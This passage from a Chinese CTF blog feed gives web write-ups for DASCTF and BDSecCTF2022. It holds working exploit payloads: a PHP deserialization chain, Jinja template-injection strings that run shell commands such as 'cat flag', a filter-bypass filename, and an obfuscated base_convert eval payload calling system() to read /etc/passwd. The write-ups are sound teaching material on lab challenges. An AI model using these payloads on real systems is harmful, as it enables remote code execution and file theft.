class="string">&#x27;s:8:&quot;password&quot;&#x27;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;s%3A14%3A%22%00User%00password%22&quot;</span>),<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>()));</span><br><span class="line">        <span class="comment">// echo &quot;运行&quot;;</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str1</span>));</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str1</span>);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = &amp;<span class="variable">$obj</span>-&gt;password;</span><br><span class="line">            <span class="comment">// $this-&gt;formatters = [&quot;_username&quot;=&gt;&quot;phpinfo&quot;];</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// trigger_deprecation(&#x27;fakerphp/faker&#x27;, &#x27;1.14&#x27;, &#x27;Accessing property &quot;%s&quot; is deprecated, use &quot;%s()&quot; instead.&#x27;, $attribute, $attribute);</span></span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$attribute</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$arguments</span> = []</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$format</span>), <span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后的Newser的<code>php引用</code>学到了，而<code>包含closure依赖中的autoload.php</code>那里还不清楚原理，要继续学一下。</p>]]></content>
      
      
      <categories>
          
          <category> DASCTF七月赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> DASCTF七月赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BDSecCTF2022-Web</title>
      <link href="/2022/07/22/BDSecCTF2022-Web/"/>
      <url>/2022/07/22/BDSecCTF2022-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="BDSecCTF2022-Web"><a href="#BDSecCTF2022-Web" class="headerlink" title="BDSecCTF2022-Web"></a>BDSecCTF2022-Web</h1><p>[toc]</p><h2 id="Jungle-Templating"><a href="#Jungle-Templating" class="headerlink" title="Jungle Templating"></a>Jungle Templating</h2><p>模板注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720232832016.png" alt="image-20220720232832016"></p><p>自动化脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123;  c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="keyword">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;&#123;% <span class="keyword">endif</span> %&#125;&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720233225401.png" alt="image-20220720233225401"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123;  c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="keyword">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% <span class="keyword">endif</span> %&#125;&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720233256890.png" alt="image-20220720233256890"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BDSEC&#123;Y3Y_7H1515_7H3_F146&#125;</span><br></pre></td></tr></table></figure><h2 id="Awesome-Note-Keeping"><a href="#Awesome-Note-Keeping" class="headerlink" title="Awesome Note Keeping"></a>Awesome Note Keeping</h2><p>源码泄露index.php.bak</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720234924808.png" alt="image-20220720234924808"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Awesome Note Keeping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;padding: 100px; background: #000000; color: #09b576&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;Welcome to Awesome Note Keeping&lt;/h1&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>])) &#123;<span class="comment">//这里是写入的方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;All fields are required.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>]) &gt;= <span class="number">13</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Note title is too long.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]) &gt;= <span class="number">40</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Note is too long.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$note_title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>]);<span class="comment">//替换flag</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$note_title</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>)) &#123;<span class="comment">//如果存在，就把其展示出来</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;There is already a note with that title and the note is &lt;br&gt;&quot;</span>;</span><br><span class="line">                    <span class="variable">$note_title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$note_title</span>);</span><br><span class="line">                    <span class="variable">$myNote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$myNote</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>));</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myNote</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;<span class="comment">//如果不存在，就写入进去</span></span><br><span class="line">                    <span class="variable">$myNote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myNote</span>, <span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]);</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myNote</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Your note has been saved.&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Sorry ! You can&#x27;t create flag note.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] != <span class="string">&quot;flag&quot;</span>) &#123;<span class="comment">//这里是读取信息的方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] . <span class="string">&quot;.txt&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$myNote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] . <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$myNote</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] . <span class="string">&quot;.txt&quot;</span>));</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$myNote</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sorry ! Couldn&#x27;t find any note with that title.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意在写入的时候，会对<code>$note_title</code>进行两次替换，将flag替换为空，所以整两次嵌套</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flaflflagagg</span><br></pre></td></tr></table></figure><p>并且第一次要创建一下<code>$note_title=flaflflagagg</code>，然后第二次的时候，满足第25行的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>))</span><br></pre></td></tr></table></figure><p>然后才会替换flag为空，读取flag.txt</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720234906221.png" alt="image-20220720234906221"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BDSEC&#123;tHe_n0t3_K33p1n6_4W350M3_N5&#125;</span><br></pre></td></tr></table></figure><h2 id="Awesome-Calculator"><a href="#Awesome-Calculator" class="headerlink" title="Awesome Calculator"></a>Awesome Calculator</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filtering</span>(<span class="params"><span class="variable">$query</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([a-z_]+)/&quot;</span>, <span class="variable">$query</span>, <span class="variable">$words</span>);</span><br><span class="line">    <span class="variable">$words</span> = <span class="variable">$words</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$good</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>, <span class="string">&#x27;ncr&#x27;</span>, <span class="string">&#x27;npr&#x27;</span>, <span class="string">&#x27;number_format&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>];</span><br><span class="line">    <span class="variable">$accept_chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789.!^&amp;|+-*/%()[],_&#x27;</span>;</span><br><span class="line">    <span class="variable">$accept_chars</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$accept_chars</span>);</span><br><span class="line">    <span class="variable">$illegal</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$words</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$words</span>[<span class="variable">$i</span>]) &amp;&amp; <span class="title function_ invoke__">array_search</span>(<span class="variable">$words</span>[<span class="variable">$i</span>], <span class="variable">$good</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$illegal</span> .= <span class="variable">$words</span>[<span class="variable">$i</span>] . <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$query</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="variable">$query</span>[<span class="variable">$i</span>], <span class="variable">$accept_chars</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$illegal</span> .= <span class="variable">$query</span>[<span class="variable">$i</span>] . <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$illegal</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_calculations</span>(<span class="params"><span class="variable">$argument</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$argument</span>) &gt; <span class="number">1030</span>) <span class="keyword">return</span> <span class="string">&quot;Calculation too long.&quot;</span>;</span><br><span class="line">    <span class="variable">$argument</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$argument</span>);</span><br><span class="line">    <span class="variable">$illegal</span> = <span class="title function_ invoke__">filtering</span>(<span class="variable">$argument</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$illegal</span>)))</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&quot;Oh my god ! What is this: &quot;</span> . <span class="variable">$illegal</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;$result=&#x27;</span> . <span class="variable">$argument</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]) &amp;&amp; <span class="keyword">die</span>(<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;My Awesome Calculator&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;margin: 50px;&quot;</span>&gt;</span><br><span class="line">    &lt;h1&gt;My Awesome Calculator&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line"></span><br><span class="line">        &lt;input placeholder=<span class="string">&quot;Surprise me with calculations&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;calculation&quot;</span> value=<span class="string">&quot;&lt;?= <span class="subst">$_GET</span>[&#x27;calculation&#x27;] ?? &#x27;&#x27; ?&gt;&quot;</span> style=<span class="string">&quot;padding: 150px; font-size: 40px;&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;calculation&#x27;</span>])) : <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;div style=<span class="string">&quot;font-size: 40px;&quot;</span>&gt;</span><br><span class="line">                Result : <span class="meta">&lt;?=</span> @<span class="title function_ invoke__">do_calculations</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;calculation&#x27;</span>]) <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span> <span class="meta">?&gt;</span></span><br><span class="line">    &lt;a href=<span class="string">&quot;?source&quot;</span>&gt;Source&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>原题</p><p><a href="https://ctftime.org/writeup/25765">CTFtime.org &#x2F; BambooFox CTF 2021 &#x2F; Calc.exe Online &#x2F; Writeup</a></p><p>cat &#x2F;etc&#x2F;passwd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">477080140104</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">189751590363</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">189803607951</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">428637964</span>,<span class="number">10</span>,<span class="number">36</span>)))</span><br></pre></td></tr></table></figure><p>其中对应关系</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>) system</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) hex2bin</span><br></pre></td></tr></table></figure><p>在原有的wp上进行修改，将&#x2F;ect&#x2F;passwd替换为<code>*</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base_convert</span>(<span class="number">82</span>,<span class="number">10</span>,<span class="number">36</span>)));   <span class="comment">//*</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;*&quot;</span>),<span class="number">36</span>,<span class="number">10</span>));</span><br></pre></td></tr></table></figure><p>最后的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">477080140104</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">82</span>,<span class="number">10</span>,<span class="number">36</span>)))</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721002946630.png" alt="image-20220721002946630"></p><h2 id="Knight-Squad-Shop"><a href="#Knight-Squad-Shop" class="headerlink" title="Knight Squad Shop"></a>Knight Squad Shop</h2><p>给了附件</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721110744901.png" alt="image-20220721110744901"></p><p>主界面</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721004053128.png" alt="image-20220721004053128"></p><p>源码中主要是三个路由</p><ol><li>&#x2F;api&#x2F;v1&#x2F;sell</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 